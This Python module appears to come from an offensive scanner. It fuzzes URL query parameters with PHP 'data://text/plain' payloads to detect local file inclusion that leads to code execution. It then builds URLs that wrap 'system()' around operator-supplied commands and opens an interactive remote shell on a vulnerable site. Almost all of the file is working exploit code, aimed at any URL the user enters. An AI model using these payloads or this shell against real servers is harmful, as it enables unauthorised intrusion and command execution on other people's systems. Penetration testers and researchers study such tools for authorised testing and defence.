import re
import base64
import random
import string
import urllib
import urllib.parse

from rich.console import Console

from core.base import BaseChecker


class DataChecker(BaseChecker):
    def __init__(self, url, silent=False):
        super().__init__(url, silent)
        self.random_string = self._generate_random_string()
        self.random_string_base64 = base64.b64encode(self.random_string.encode()).decode()
        half = len(self.random_string_base64) // 2
        self.random_string_base64_first_half = self.random_string_base64[:half]
        self.random_string_base64_second_half = self.random_string_base64[half:]
        self.DATA_PAYLOADS = [
            f'data://text/plain,<?php echo "{self.random_string_base64_first_half}" . "{self.random_string_base64_second_half}"; ?>',
        ]

    def _generate_random_string(self, length=10):
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def data_check(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        payloads = []

        for payload in self.DATA_PAYLOADS:
            payloads.append((payload, re.compile(fr'{self.random_string_base64}')))

        console = Console()
        total_operations = len(params.keys()) * len(payloads)

        if not self.silent:
            return self._scan(params, payloads, parsed_url, console, total_operations)

        return self._scan(params, payloads, parsed_url, console)

    def _scan(self, params, payloads, parsed_url, console, total_operations=None, progress=None):
        if progress:
            progress.add_task("[cyan]Scanning...", total=total_operations)

        for param_name in params.keys():
            for payload, payload_regex in payloads:
                new_params = params.copy()
                new_params[param_name] = payload
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

                response = self._safe_get(fuzzed_url)
                if response is None:
                    return False, None
                if payload_regex.search(response.text):
                    if not self.silent:
                        console.print('\n[bold red]Possible LFI2RCE (data_wrapper: method)[/bold red] (data: method)', style='bold red')
                    return True, param_name

        return False, None

    def _build_shell_url(self, cmd, param_name):
        shell_code = f"data://text/plain,<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        new_params = params.copy()
        new_params[param_name] = shell_code
        new_query = urllib.parse.urlencode(new_params, doseq=True)
        fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
        return fuzzed_url, "GET", {}

    def run_shell(self, param_name):
        self.silent = True
        result, _ = self.data_check()
        if not result:
            self.console.print("[bold red]LFI2RCE not detected or not exploitable.[/bold red]")
            return

        self._interactive_shell(param_name, self._build_shell_url)


def main():
    url = input('Enter site URL to test: ')
    checker = DataChecker(url, silent=False)
    result, param_name = checker.data_check()
    print(f"LFI2RCE detected: {result}")
    if result:
        checker.run_shell(param_name)

if __name__ == '__main__':
    main()
